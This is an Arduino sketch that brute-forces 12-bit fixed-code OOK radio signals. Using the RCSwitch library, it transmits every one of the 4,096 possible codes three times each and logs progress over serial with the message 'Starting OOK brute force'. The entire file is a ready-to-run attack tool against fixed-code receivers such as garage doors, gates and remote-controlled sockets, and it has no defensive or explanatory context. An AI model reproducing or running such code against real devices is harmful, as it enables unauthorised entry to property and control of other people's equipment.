#include <RCSwitch.h>

RCSwitch mySwitch = RCSwitch();

const uint8_t bitLength = 12;
uint32_t currentCode = 0;
const uint32_t maxCode = (1UL << bitLength) - 1;

const unsigned long interval = 150;  // interval medzi vysielaniami [ms]
unsigned long previousMillis = 0;

const uint8_t repeatCount = 3;
uint8_t repeatSent = 0;

void setup() {
  mySwitch.enableTransmit(10); // Arduino pin D10
  mySwitch.setPulseLength(320);
  mySwitch.setProtocol(1);
  Serial.begin(115200);
  Serial.println("Starting OOK brute force");
}

void loop() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= interval) {
    previousMillis = currentMillis;

    mySwitch.send(currentCode, bitLength);
    Serial.print("Sent code: ");
    Serial.print(currentCode, BIN);
    Serial.print(" repeat: ");
    Serial.println(repeatSent + 1);

    repeatSent++;

    if (repeatSent >= repeatCount) {
      repeatSent = 0;
      currentCode++;
      if (currentCode > maxCode) {
        Serial.println("Finished all codes.");
        while (1);
      }
    }
  }
// Buttons, LEDs
}